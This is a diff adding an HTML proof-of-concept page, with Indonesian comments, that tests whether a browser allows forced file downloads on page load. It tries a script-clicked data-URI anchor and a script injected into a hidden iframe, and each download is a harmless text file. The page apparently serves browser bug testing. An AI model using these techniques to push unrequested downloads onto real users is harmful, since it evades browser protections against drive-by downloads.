@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC: File Download Activation Bypass Test</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            padding: 20px;
+            background-color: #f5f5f7;
+            color: #1d1d1f;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: #ffffff;
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+        h2 { color: #ff3b30; border-bottom: 2px solid #ff3b30; padding-bottom: 10px; }
+        .log-box {
+            background: #1e1e1e;
+            color: #39ff14;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: monospace;
+            min-height: 100px;
+            white-space: pre-wrap;
+            margin-top: 15px;
+        }
+        iframe { display: none; width: 0; height: 0; border: none; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>PoC: File Download Activation Bypass</h2>
+    <p><strong>Deskripsi:</strong> Menguji apakah browser mengizinkan pengunduhan file otomatis secara paksa saat halaman dimuat (onload) tanpa adanya interaksi atau klik fisik dari pengguna.</p>
+    
+    <div id="status">Menjalankan pengujian otomatis...</div>
+    <div class="log-box" id="log">Console Log:<br></div>
+</div>
+
+<script>
+    function logMessage(msg) {
+        document.getElementById('log').innerHTML += "[*] " + msg + "<br>";
+    }
+
+    window.onload = function() {
+        logMessage("Halaman selesai dimuat. Memulai eksploitasi otomatis...");
+
+        // ==========================================
+        // METODE 1: Direct Anchor Execution (Blob/Data URI)
+        // ==========================================
+        try {
+            logMessage("Mencoba Metode 1: Direct Anchor Trigger...");
+            const a = document.createElement('a');
+            a.href = 'data:text/plain;charset=utf-8,' + encodeURIComponent('BUG FOUND: File ini terunduh tanpa interaksi pengguna sama sekali!');
+            a.download = 'metode1_bypass.txt';
+            document.body.appendChild(a);
+            a.click(); // Memaksa klik via skrip
+            document.body.removeChild(a);
+            logMessage("Metode 1 dieksekusi.");
+        } catch (e) {
+            logMessage("Metode 1 Gagal/Error: " + e.message);
+        }
+
+        // ==========================================
+        // METODE 2: Nested Iframe Injection
+        // ==========================================
+        setTimeout(function() {
+            try {
+                logMessage("Mencoba Metode 2: Nested IFrame Injection (Bypass Sandbox)...");
+                
+                // Membuat Iframe utama
+                const iframe = document.createElement('iframe');
+                document.body.appendChild(iframe);
+                
+                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                iframeDoc.open();
+                
+                // Menyuntikkan skrip unduhan di dalam konteks dokumen iframe
+                const iframeContent = `
+                    <script>
+                        window.onload = function() {
+                            var a = document.createElement('a');
+                            a.href = 'data:text/plain;charset=utf-8,Payload%20Metode%202%20Sukses';
+                            a.download = 'metode2_nested_bypass.txt';
+                            document.body.appendChild(a);
+                            a.click();
+                        };
+                    <\/script>
+                `;
+                
+                iframeDoc.write(iframeContent);
+                iframeDoc.close();
+                logMessage("Metode 2 dieksekusi di dalam nested context.");
+            } catch (e) {
+                logMessage("Metode 2 Gagal/Error: " + e.message);
+            }
+            
+            document.getElementById('status').innerHTML = "<strong>Pengujian Selesai.</strong> Periksa apakah ada pop-up unduhan file atau file yang tersimpan di folder Downloads perangkat.";
+        }, 1500); // Penundaan 1.5 detik agar tidak bentrok dengan metode 1
+    };
+</script>
+
+</body>
+</html>
